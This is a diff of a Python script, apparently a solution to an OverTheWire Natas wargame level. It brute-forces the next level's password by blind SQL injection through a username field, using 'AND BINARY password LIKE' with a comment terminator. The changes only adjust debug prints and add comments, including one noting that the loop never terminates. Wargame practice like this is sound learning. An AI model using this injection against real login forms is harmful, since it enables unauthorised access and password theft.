@@ -18,11 +18,13 @@ session = requests.Session()
 confirmed_pass = list()
 while (True):
   for ch in chars:
-    #print("Attempting w/pw ", "".join(confirmed_pass) + ch)
+    print("Attempting w/pw ", "".join(confirmed_pass) + ch)
+    #Binary will force case sensitivity - SQL is case agnostic otherwise
     post = session.post(url, data = {"username":'natas16" AND BINARY password LIKE "' + "".join(confirmed_pass) + ch + '%" # '}, auth = (username, password))
     content = post.text
-    print(confirmed_pass)
+    #print(confirmed_pass)
     if('user exists' in content):
         confirmed_pass.append(ch)
         break
-print("END:" + confirmed_pass)
+#Program currently does not break out once characters begin looping again after pw is 32 chars long
+#print("END:" + confirmed_pass)
